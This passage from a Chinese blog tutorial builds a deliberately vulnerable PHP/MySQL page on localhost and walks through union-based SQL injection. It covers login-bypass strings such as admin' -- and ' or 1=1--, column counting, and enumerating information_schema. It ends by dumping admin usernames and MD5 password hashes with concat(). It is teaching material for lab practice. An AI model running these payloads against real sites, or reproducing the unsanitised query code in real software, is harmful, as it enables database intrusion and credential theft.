sec)mysql&gt; delete from admin where id=1;Query OK, 1 row affected (0.00 sec) 可以看到我上面已经删除了两条数据，现在查询admin数据库里面应该什么都没有12mysql&gt; select * from admin;Empty set (0.00 sec) 常见的方式手工判断网站是否可以注入12345671=1 and 1=2admin' --admin' #admin'/*' or 1=1--' or 1=1/*' or 1=1# SQL注入的准备什么是SQL注入攻击？ SQL攻击（英语：SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。（引用wiki） sql注入实验环境： phpstudy集成环境 IDE:sublime text3 没有的自行百度！！！ 编写一个有漏洞的PHP代码首先我们需要启动mysql，创建一个数据库命名为sqlin,并且切换过去 use sqlin12create database sqlin default character set utf8 collate utf8_general_ci;use sqlin; 创建admin表和page表：12345678mysql&gt; create table admin( -&gt; id int(3) auto_increment not null primary key, -&gt; username varchar(15) not null, -&gt; password char(32));mysql&gt; create table page( -&gt; id int(3) auto_increment not null primary key, -&gt; title varchar(20), -&gt; content varchar(255)); 向admin、page表里面分别插入数据1234mysql&gt; insert into admin(username,password) values('smelond','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into admin(username,password) values('admin','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into page(title,content) values('sqlzhuru','https://smelond.com');mysql&gt; insert into page(title,content) values('test','smelond.com'); 上面的efe6398127928f1b2e9ef3207fb82663是32位的md5值，没加密之前是qweqwe 然后我们查询一下是数据是否插入成功：12345678910111213141516mysql&gt; select * from admin;+----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | smelond | efe6398127928f1b2e9ef3207fb82663 || 2 | admin | efe6398127928f1b2e9ef3207fb82663 |+----+----------+----------------------------------+2 rows in set (0.00 sec)mysql&gt; select * from page;+----+----------+---------------------+| id | title | content |+----+----------+---------------------+| 1 | sqlzhuru | https://smelond.com || 2 | test | smelond.com |+----+----------+---------------------+2 rows in set (0.00 sec) 解释一下，为什么我们创建了一个数据库会又在数据库里面创建了两个表？为什么不是一个表？原因是因为： 在真实的网站案例中，没有管理员会把所有的数据都放在一个表中，而是多个表、多个数据库(方便管理)。 放在一个表中查询很麻烦，比如文章，用户名，一些个人信息等。 还有很多很多原因。。。 编写php代码没学过php，代码写的不行，路过的大神可以帮忙看看1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.com--&gt;&lt;body/&gt;&lt;/html&gt;&lt;?php $id = $_GET['x']; $link=mysqli_connect("127.0.0.1","root","root","sqlin");//连接数据库 if ($link) &#123;//判断数据库是否存在 mysqli_query($link,"set names utf8");//设置编码格式 $sql="select * from page where id=$id";//查询 $re=mysqli_query($link,$sql);//执行查询语句 $data=mysqli_fetch_assoc($re);//获取数据库返回的内容 echo "文章id：".$data['id']."&lt;hr /&gt;"; echo "文章标题：".$data['title']."&lt;hr /&gt;"; echo "文章内容：".$data['content']."&lt;hr /&gt;"; echo "当前执行sql语句：".$sql; &#125;else&#123; echo "好像出错了，原因有很多...所以你先去看看你的数据库配置好没。。。"; &#125;?&gt; 上面的代码中，我们连接数据库是slqin，查询的数据表时page，并没有用到admin那个表，因为网页显示的是文章或一些其他的内容。 开始我们的表演我刚刚已经将我写的代码放到了phpstudy的WWW目录下了我的路径是：D:\phpStudy\PHPTutorial\WWW\webpentest\mysql\index.php现在开始访问网站1http://127.0.0.1/webpentest/mysql/index.php 访问进入之后可能就是一些报错信息，不管这些，因为页面上的内容是从数据库里面调用的，然后在index.php后面加上?x=11http://127.0.0.1/webpentest/mysql/index?x=1 //?x=1意思是从数据库里面找id=1的内容 现在看看，网页上面是否有了正常数据库了呢 简单的判断是否存在注入判断网站是否存在注入，可以先试着在?x=1后面加上and 1=1、and 1=2 加上and 1=1会返回正常页面，如果出现安全狗之类的（实战中）错误，以后再说 加上and 1=2返回页面错误，就可能有注入了，因为页面上的内容是到数据库里面查询返回结果的 加上and 1=2时，看下面语句：12345678910mysql&gt; select * from page where id=1 and 1=1;+----+----------+---------------------+| id | title | content |+----+----------+---------------------+| 1 | sqlzhuru | https://smelond.com |+----+----------+---------------------+1 row in set (0.00 sec) //正常返回mysql&gt; select * from page where id=1 and 1=2;Empty set (0.00 sec) //看吧，没有返回,所以网页上面没有内容 在页面后面加上 and 1=2,没有正常返回结果，那当然就是有注入了看到当前执行的语句为：select * from page where id=1 and 1=2 查询数据库信息 order by number //判断字段 union select 1,2,3… //将两个表合并一起查询 database() //数据库名 user() //数据库用户 version() //数据库版本 @@version_compile_os //操作系统 拿上刚刚写的页面测试order by http://127.0.0.1/webpentest/mysql/index.php?x=1 order by 5 //返回错误 http://127.0.0.1/webpentest/mysql/index.php?x=1 order by 2 //返回正常 http://127.0.0.1/webpentest/mysql/index.php?x=1 order by 3 //返回正常 http://127.0.0.1/webpentest/mysql/index.php?x=1 order by 4 //返回错误好了，现在已经判断出一共有3个字段了 接着 union http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3又有了同学问道，为啥前面要加上and 1=2 ？原因是因为：先让网页报错，然后进行union后面的查询，这样后面查询的内容才会显示在网页上。网页已经显示出了我们查询的1,2,3 再来查询数据库名，数据库用户，数据库版本 http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select database(),user(),version()现在已经获取到了数据库名，数据库用户，数据库版本了 一个小小的提示： mysql5.0以上的数据库自带：information_schema information_schema数据库存储了mysql下所有的数据库、表名、列名请你一定记住这个，而且现在基本都是mysql5.0以上的数据库了 information_schema表该怎么用？现在我们已经获取到了数据库名：sqlin；数据库用户：root；数据库版本：5.5.53在数据库查询语句中”.”表示下一级的意思 information_schema.schemata information_schema数据库里面的schemata表，他里面存储了所有数据库名称。 information_schema.tables information_schema数据库里面的tables表，他里面存储了所有数据库下的表名信息。 information_schema.columns： information_schema数据库里面的columns表，他里面存储了所有数据库下的列名信息。 table_schema 数据表所属的数据库名 table_name 表名称 column_name 列名称 schema_name 数据库名 获取数据库下的表名信息然后我们现在来试着获取sqlin数据库下的所有表名信息：12345http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select table_name,2,3 from information_schema.tables where table_schema='sqlin' limit 0,1// limit 0,1表示从0开始，取1个，然后我们拿到了数据库sqlin下的数据表adminhttp://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select table_name,2,3 from information_schema.tables where table_schema='sqlin' limit 1,1// limit 1,1表示从1开始，取1个，然后我们又拿到数据库sqlin下的数据库page 同时取多个：首先我们试试：12http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select table_name,table_name,3 from information_schema.tables where table_schema='sqlin' limit 0,2// 返回内容发现两个都是admin，显然，这种limit 0,2的方法是不行的，因为并没有显示page表 再试试：1234http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select table_name,(select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),3 from information_schema.tables where table_schema='sqlin' limit 0,2// 从0开始，取两个，第二个会显示出来admin，为了让他显示page，所以我果断的将table_name改为了// (select table_name from information_schema.tables where table_schema='sqlin' limit 1,1)// 在这个里面，查询出来的很明显就应该是page，所以同时就取出来了两个 我们在数据库里面简单的测试一下1234567891011121314151617181920212223mysql&gt; select table_name,2,3 from information_schema.tables where table_schema='sqlin' limit 0,1;+------------+---+---+| table_name | 2 | 3 |+------------+---+---+| admin | 2 | 3 |+------------+---+---+1 row in set (0.00 sec)mysql&gt; select table_name,2,3 from information_schema.tables where table_schema='sqlin' limit 1,1;+------------+---+---+| table_name | 2 | 3 |+------------+---+---+| page | 2 | 3 |+------------+---+---+1 row in set (0.00 sec)mysql&gt; select table_name,(select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),2 from information_schema.tables where table_schema='sqlin' limit 0,1;+------------+-----------------------------------------------------------------------------------------+---+| table_name | (select table_name from information_schema.tables where table_schema='sqlin' limit 1,1) | 2 |+------------+-----------------------------------------------------------------------------------------+---+| admin | page | 2 |+------------+-----------------------------------------------------------------------------------------+---+1 row in set (0.00 sec) 现在我们已经获取到一下内容： 网站数据库名: sqlin 数据库版本: 5.5.53 数据库用户: root 当前网站数据库下的表名: 分别为admin,page 获取数据库下的表名下的列名信息上面我们已经获取到了sqlin数据库，并且获取到了sqlin数据库下面的admin表，以及page表从表的名称可以看出，admin表肯定是存储用户登录账户和密码的 继续获取admin表里面的列名信息：123456http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select column_name,2,3 from information_schema.columns where table_name='admin' limit 0,1// 获取到了id列名http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select column_name,2,3 from information_schema.columns where table_name='admin' limit 1,1// 获取到了user列名http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select column_name,2,3 from information_schema.columns where table_name='admin' limit 2,1// 获取到了password列名 需要的东西都已经获取到了：网站数据库：sqlin数据库下的表：admin，pageadmin表下的列名：id,username,password 还差最后一步，获取username,password里面的内容这就简单了，没有之前那么繁琐只需要查询即可：123http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select username,password,3 from adminsmelondefe6398127928f1b2e9ef3207fb82663 偶然发现了一个很好玩的函数concat()concat函数用于连接两个或多个字符串，形成一个字符串。好了，现在有同学问，这个函数在sql注入中有什么作用？cmd里面打开我们的mysql 测试一下就知道了：12345678910111213141516171819202122mysql&gt; select concat(123,':::','qwe');+-------------------------+| concat(123,':::','qwe') |+-------------------------+| 123:::qwe |+-------------------------+1 row in set (0.00 sec)mysql&gt; select concat(123,'qwe');+-------------------+| concat(123,'qwe') |+-------------------+| 123qwe |+-------------------+1 row in set (0.00 sec)mysql&gt; select concat('用户名：','smelond','密码：','qweqwe');+------------------------------------------------+| concat('用户名：','smelond','密码：','qweqwe') |+------------------------------------------------+| 用户名：smelond密码：qweqwe |+------------------------------------------------+1 row in set, 2 warnings (0.00 sec) 现在好像知道有啥用了，哈哈！！！比如我们在进行sql注入时，发现只有一个地方有回显，但是想同时查询username，password，等多个内容，这个时候我们就可以用concat() 好了，我还是拿着代码去试试吧。12345678http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select concat('&lt;br&gt;账号：',username,'&lt;br&gt;','密码：',password),2,3 from admin输出结果： // 账号：smelond // 密码：efe6398127928f1b2e9ef3207fb82663http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select concat(username,'&gt;&gt;&gt;',password),2,3 from admin输出结果： // smelond&gt;&gt;&gt;efe6398127928f1b2e9ef3207fb82663 当然不止上面这个一点用法咯，还有：1http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,concat(table_name,':',(select table_name from information_schema.tables where table_schema='sqlin' limit 1,1)),3 from information_schema.tables where table_schema='sqlin' limit 0,1 这回好像没毛病了吧，哈哈，emmmmmmmmm！！！ 最后，记得拿着md5值去解密。。。 efe6398127928f1b2e9ef3207fb82663 == qweqwe]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
</search>
